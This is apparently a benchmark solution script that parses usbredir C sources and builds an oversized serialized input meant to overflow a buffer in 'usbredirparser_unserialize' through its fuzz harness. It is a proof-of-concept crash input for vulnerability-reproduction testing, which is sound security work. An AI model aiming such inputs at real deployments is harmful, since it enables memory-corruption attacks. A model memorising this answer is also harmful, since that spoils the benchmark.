import os
import re
import tarfile
import ast
import struct
from typing import Dict, List, Optional, Tuple, Iterable


def _is_tar(path: str) -> bool:
    lower = path.lower()
    return lower.endswith((".tar", ".tar.gz", ".tgz", ".tar.bz2", ".tbz2", ".tar.xz", ".txz"))


def _iter_source_files_from_dir(root: str) -> Iterable[Tuple[str, bytes]]:
    for base, _, files in os.walk(root):
        for fn in files:
            if not fn.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hpp")):
                continue
            p = os.path.join(base, fn)
            try:
                st = os.stat(p)
            except OSError:
                continue
            if st.st_size > 5_000_000:
                continue
            try:
                with open(p, "rb") as f:
                    yield p, f.read()
            except OSError:
                continue


def _iter_source_files_from_tar(tar_path: str) -> Iterable[Tuple[str, bytes]]:
    with tarfile.open(tar_path, "r:*") as tf:
        for m in tf.getmembers():
            if not m.isfile():
                continue
            name = m.name
            if not name.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hpp")):
                continue
            if m.size > 5_000_000:
                continue
            try:
                f = tf.extractfile(m)
                if f is None:
                    continue
                data = f.read()
                yield name, data
            except Exception:
                continue


def _iter_source_files(src_path: str) -> Iterable[Tuple[str, bytes]]:
    if os.path.isdir(src_path):
        yield from _iter_source_files_from_dir(src_path)
    elif _is_tar(src_path):
        yield from _iter_source_files_from_tar(src_path)
    else:
        yield from _iter_source_files_from_dir(src_path)


def _strip_c_comments_and_strings(s: str) -> str:
    res = []
    i = 0
    n = len(s)
    while i < n:
        c = s[i]
        if c == '"':
            i += 1
            while i < n:
                if s[i] == "\\":
                    i += 2
                elif s[i] == '"':
                    i += 1
                    break
                else:
                    i += 1
            res.append('""')
            continue
        if c == "'":
            i += 1
            while i < n:
                if s[i] == "\\":
                    i += 2
                elif s[i] == "'":
                    i += 1
                    break
                else:
                    i += 1
            res.append("''")
            continue
        if c == "/" and i + 1 < n and s[i + 1] == "/":
            i += 2
            while i < n and s[i] != "\n":
                i += 1
            res.append("\n")
            continue
        if c == "/" and i + 1 < n and s[i + 1] == "*":
            i += 2
            while i + 1 < n and not (s[i] == "*" and s[i + 1] == "/"):
                i += 1
            i += 2 if i + 1 < n else 0
            res.append(" ")
            continue
        res.append(c)
        i += 1
    return "".join(res)


class _SafeEval(ast.NodeVisitor):
    __slots__ = ("_ok",)

    def __init__(self) -> None:
        self._ok = True

    def generic_visit(self, node):
        self._ok = False

    def visit_Expression(self, node: ast.Expression):
        self.visit(node.body)

    def visit_Constant(self, node: ast.Constant):
        if not isinstance(node.value, (int, bool)):
            self._ok = False

    def visit_Num(self, node: ast.Num):  # pragma: no cover
        if not isinstance(node.n, (int, bool)):
            self._ok = False

    def visit_UnaryOp(self, node: ast.UnaryOp):
        if not isinstance(node.op, (ast.UAdd, ast.USub, ast.Invert)):
            self._ok = False
            return
        self.visit(node.operand)

    def visit_BinOp(self, node: ast.BinOp):
        if not isinstance(
            node.op,
            (
                ast.Add,
                ast.Sub,
                ast.Mult,
                ast.FloorDiv,
                ast.Div,
                ast.Mod,
                ast.LShift,
                ast.RShift,
                ast.BitOr,
                ast.BitAnd,
                ast.BitXor,
            ),
        ):
            self._ok = False
            return
        self.visit(node.left)
        self.visit(node.right)

    def visit_ParenExpr(self, node):  # pragma: no cover
        self._ok = False


def _eval_c_int_expr(expr: str) -> Optional[int]:
    expr = expr.strip()
    if not expr:
        return None
    expr = re.sub(r"(?<![0-9A-Za-z_])([0-9]+)([uUlL]+)(?![0-9A-Za-z_])", r"\1", expr)
    expr = re.sub(r"(?<![0-9A-Za-z_])(0x[0-9a-fA-F]+)([uUlL]+)(?![0-9A-Za-z_])", r"\1", expr)
    expr = expr.replace("/", "//")
    expr = re.sub(r"\b(sizeof|alignof)\b\s*\([^)]*\)", "0", expr)
    expr = re.sub(r"\b([A-Za-z_][A-Za-z0-9_]*)\b", "0", expr)
    try:
        tree = ast.parse(expr, mode="eval")
    except Exception:
        return None
    v = _SafeEval()
    v.visit(tree)
    if not v._ok:
        return None
    try:
        val = eval(compile(tree, "<expr>", "eval"), {"__builtins__": {}}, {})
    except Exception:
        return None
    try:
        return int(val)
    except Exception:
        return None


def _find_define_int(sources: Iterable[str], name: str) -> Optional[int]:
    pat = re.compile(r"^[ \t]*#[ \t]*define[ \t]+" + re.escape(name) + r"[ \t]+(.+?)\s*$", re.M)
    for s in sources:
        m = pat.search(s)
        if not m:
            continue
        val = m.group(1)
        val = val.split("//", 1)[0].strip()
        val = re.sub(r"/\*.*?\*/", "", val).strip()
        v = _eval_c_int_expr(val)
        if v is not None:
            return v
    return None


def _detect_endian(sources: Iterable[str]) -> str:
    joined = "\n".join(sources)
    if re.search(r"\b(TO_LE|to_le|htole|le32toh|le64toh)\b", joined):
        return "little"
    if re.search(r"\b(TO_BE|to_be|htobe|be32toh|be64toh)\b", joined):
        return "big"
    return "little"


def _extract_function_body(code: str, funcname: str) -> Optional[str]:
    code2 = _strip_c_comments_and_strings(code)
    m = re.search(r"\b" + re.escape(funcname) + r"\s*\([^;{]*\)\s*\{", code2)
    if not m:
        return None
    start = m.end() - 1
    i = start
    n = len(code2)
    if i >= n or code2[i] != "{":
        return None
    depth = 0
    j = i
    while j < n:
        c = code2[j]
        if c == "{":
            depth += 1
        elif c == "}":
            depth -= 1
            if depth == 0:
                return code2[i + 1 : j]
        j += 1
    return None


def _extract_balanced(s: str, i: int, open_ch: str, close_ch: str) -> Tuple[str, int]:
    n = len(s)
    while i < n and s[i].isspace():
        i += 1
    if i >= n or s[i] != open_ch:
        return "", i
    i += 1
    start = i
    depth = 1
    while i < n:
        c = s[i]
        if c == open_ch:
            depth += 1
        elif c == close_ch:
            depth -= 1
            if depth == 0:
                return s[start:i], i + 1
        i += 1
    return s[start:], n


def _skip_space(s: str, i: int) -> int:
    n = len(s)
    while i < n and s[i].isspace():
        i += 1
    return i


def _skip_stmt_or_block(s: str, i: int) -> int:
    n = len(s)
    i = _skip_space(s, i)
    if i >= n:
        return n
    if s[i] == "{":
        _, j = _extract_balanced(s, i, "{", "}")
        return j
    in_paren = 0
    while i < n:
        c = s[i]
        if c == "(":
            in_paren += 1
        elif c == ")":
            if in_paren > 0:
                in_paren -= 1
        elif c == ";" and in_paren == 0:
            return i + 1
        elif c == "{" and in_paren == 0:
            _, j = _extract_balanced(s, i, "{", "}")
            return j
        i += 1
    return n


def _first_arg(expr: str) -> str:
    expr = expr.strip()
    depth = 0
    for k, ch in enumerate(expr):
        if ch in "([{":
            depth += 1
        elif ch in ")]}":
            if depth > 0:
                depth -= 1
        elif ch == "," and depth == 0:
            return expr[:k].strip()
    return expr.strip()


def _normalize_var(v: str) -> str:
    v = v.strip()
    if v.startswith("&"):
        v = v[1:].strip()
    v = v.strip("() \t\r\n")
    return v


def _collect_unserialize_ops(func_body: str) -> List[Tuple[str, str, bool]]:
    calls = ("unserialize_uint8", "unserialize_uint16", "unserialize_uint32", "unserialize_uint64", "unserialize_data")
    ops: List[Tuple[str, str, bool]] = []

    def parse_block(block: str, in_write_loop: bool) -> None:
        i = 0
        n = len(block)
        while i < n:
            next_pos = None
            next_tok = None
            for tok in ("for", "while", "if") + calls:
                p = block.find(tok, i)
                if p == -1:
                    continue
                if next_pos is None or p < next_pos:
                    next_pos = p
                    next_tok = tok
            if next_pos is None:
                break
            i = next_pos

            if next_tok in ("for", "while"):
                pre_ok = (i == 0 or not (block[i - 1].isalnum() or block[i - 1] == "_")) and (
                    i + len(next_tok) >= n or not (block[i + len(next_tok)].isalnum() or block[i + len(next_tok)] == "_")
                )
                if not pre_ok:
                    i += len(next_tok)
                    continue
                j = i + len(next_tok)
                header, j2 = _extract_balanced(block, _skip_space(block, j), "(", ")")
                j2 = _skip_space(block, j2)
                body_start = j2
                body_end = _skip_stmt_or_block(block, body_start)
                body_txt = block[body_start:body_end]
                is_write = ("write" in header.lower() and "buf" in header.lower())
                if is_write:
                    if body_txt.lstrip().startswith("{"):
                        inner, _ = _extract_balanced(body_txt, body_txt.find("{"), "{", "}")
                        parse_block(inner, True)
                    else:
                        parse_block(body_txt, True)
                i = body_end
                continue

            if next_tok == "if":
                pre_ok = (i == 0 or not (block[i - 1].isalnum() or block[i - 1] == "_")) and (
                    i + 2 >= n or not (block[i + 2].isalnum() or block[i + 2] == "_")
                )
                if not pre_ok:
                    i += 2
                    continue
                j = i + 2
                cond, j2 = _extract_balanced(block, _skip_space(block, j), "(", ")")
                parse_inline_calls(cond, in_write_loop)
                i = _skip_stmt_or_block(block, j2)
                continue

            if next_tok in calls:
                pre_ok = (i == 0 or not (block[i - 1].isalnum() or block[i - 1] == "_")) and (
                    i + len(next_tok) >= n or not (block[i + len(next_tok)].isalnum() or block[i + len(next_tok)] == "_")
                )
                if not pre_ok:
                    i += len(next_tok)
                    continue
                args, j2 = _extract_balanced(block, _skip_space(block, i + len(next_tok)), "(", ")")
                v = _normalize_var(_first_arg(args))
                kind = next_tok.replace("unserialize_", "")
                ops.append((kind, v, in_write_loop))
                i = j2
                continue

            i += 1

    def parse_inline_calls(text: str, in_write_loop: bool) -> None:
        p = 0
        nt = len(text)
        while p < nt:
            found = None
            fpos = None
            for tok in calls:
                q = text.find(tok, p)
                if q == -1:
                    continue
                if fpos is None or q < fpos:
                    fpos = q
                    found = tok
            if fpos is None or found is None:
                break
            pre_ok = (fpos == 0 or not (text[fpos - 1].isalnum() or text[fpos - 1] == "_")) and (
                fpos + len(found) >= nt or not (text[fpos + len(found)].isalnum() or text[fpos + len(found)] == "_")
            )
            if not pre_ok:
                p = fpos + len(found)
                continue
            args, p2 = _extract_balanced(text, _skip_space(text, fpos + len(found)), "(", ")")
            v = _normalize_var(_first_arg(args))
            kind = found.replace("unserialize_", "")
            ops.append((kind, v, in_write_loop))
            p = p2

    parse_block(func_body, False)
    return ops


def _choose_opcode_from_harness(harness: str) -> int:
    hb = _strip_c_comments_and_strings(harness)
    if "switch" in hb and "case" in hb and "usbredirparser_send" in hb:
        mfunc = re.search(r"\bLLVMFuzzerTestOneInput\b", hb)
        if mfunc:
            body = _extract_function_body(hb, "LLVMFuzzerTestOneInput") or hb
        else:
            body = hb
        cases = re.finditer(r"\bcase\s+(\d+)\s*:", body)
        best = None
        for cm in cases:
            v = int(cm.group(1))
            start = cm.end()
            next_case = re.search(r"\bcase\s+\d+\s*:\s*|\bdefault\s*:\s*", body[start:])
            end = start + (next_case.start() if next_case else len(body) - start)
            chunk = body[start:end]
            if "usbredirparser_send" in chunk:
                best = v
                if "ConsumeRemainingBytes" in chunk or "remaining_bytes" in chunk:
                    return v
        if best is not None:
            return best
    return 0


class Solution:
    def solve(self, src_path: str) -> bytes:
        src_texts: List[str] = []
        harness_text: Optional[str] = None
        file_with_unserialize: Optional[str] = None
        unserialize_code: Optional[str] = None

        for name, data in _iter_source_files(src_path):
            try:
                txt = data.decode("utf-8", "ignore")
            except Exception:
                continue
            src_texts.append(txt)
            if harness_text is None and "LLVMFuzzerTestOneInput" in txt:
                harness_text = txt
            if ("usbredirparser_unserialize" in txt) and (unserialize_code is None):
                unserialize_code = txt
                file_with_unserialize = name

        buf_size = _find_define_int(src_texts, "USBREDIRPARSER_SERIALIZE_BUF_SIZE")
        if buf_size is None or buf_size <= 0 or buf_size > 10_000_000:
            buf_size = 64 * 1024

        version = _find_define_int(src_texts, "USBREDIRPARSER_SERIALIZE_VERSION")
        if version is None or version < 0 or version > 0xFFFFFFFF:
            version = 1

        endian = _detect_endian(src_texts)
        le = (endian == "little")

        payload_len = int(buf_size)
        if payload_len < 1024:
            payload_len = 65536

        uses_unserialize = False
        if harness_text:
            if "usbredirparser_unserialize" in harness_text:
                uses_unserialize = True
        else:
            for t in src_texts:
                if "usbredirparser_unserialize" in t and ("LLVMFuzzerTestOneInput" in t or "main(" in t):
                    uses_unserialize = True
                    break

        opcode = _choose_opcode_from_harness(harness_text or "")

        def pack_u(bits: int, val: int) -> bytes:
            if bits == 8:
                return struct.pack("B", val & 0xFF)
            if bits == 16:
                return struct.pack("<H" if le else ">H", val & 0xFFFF)
            if bits == 32:
                return struct.pack("<I" if le else ">I", val & 0xFFFFFFFF)
            if bits == 64:
                return struct.pack("<Q" if le else ">Q", val & 0xFFFFFFFFFFFFFFFF)
            return b""

        def decide_int(var_expr: str, bits: int, in_write_loop: bool) -> int:
            v = var_expr.lower()
            if "version" in v:
                return version
            if "magic" in v:
                return 0
            if ("write" in v and "buf" in v):
                if any(x in v for x in ("count", "cnt", "num", "nr", "nb", "n_", "nwrite")):
                    return 1
                if in_write_loop and any(x in v for x in ("len", "size", "bytes")):
                    return payload_len
            if any(x in v for x in ("count", "cnt", "num", "nr", "nb", "n_")):
                return 0
            if in_write_loop and any(x in v for x in ("len", "size", "bytes")) and "write" in v:
                return payload_len
            return 0

        if uses_unserialize and unserialize_code:
            ub = _extract_function_body(unserialize_code, "usbredirparser_unserialize")
            if ub:
                ops = _collect_unserialize_ops(ub)
                out = bytearray()
                injected = False
                for kind, var, in_w in ops:
                    if kind == "uint8":
                        out += pack_u(8, decide_int(var, 8, in_w))
                    elif kind == "uint16":
                        out += pack_u(16, decide_int(var, 16, in_w))
                    elif kind == "uint32":
                        out += pack_u(32, decide_int(var, 32, in_w))
                    elif kind == "uint64":
                        out += pack_u(64, decide_int(var, 64, in_w))
                    elif kind == "data":
                        if in_w and not injected:
                            out += pack_u(32, payload_len)
                            out += b"B" * payload_len
                            injected = True
                        else:
                            out += pack_u(32, 0)
                    else:
                        pass
                if not injected:
                    out2 = bytearray()
                    out2 += pack_u(32, version)
                    out2 += pack_u(32, 0)
                    out2 += pack_u(32, 0)
                    out2 += pack_u(32, 0)
                    out2 += pack_u(32, 1)
                    out2 += pack_u(32, payload_len)
                    out2 += b"B" * payload_len
                    return bytes(out2)
                return bytes(out)

        prefix = struct.pack("<I", opcode)
        if le:
            return prefix + (b"A" * payload_len)
        return struct.pack(">I", opcode) + (b"A" * payload_len)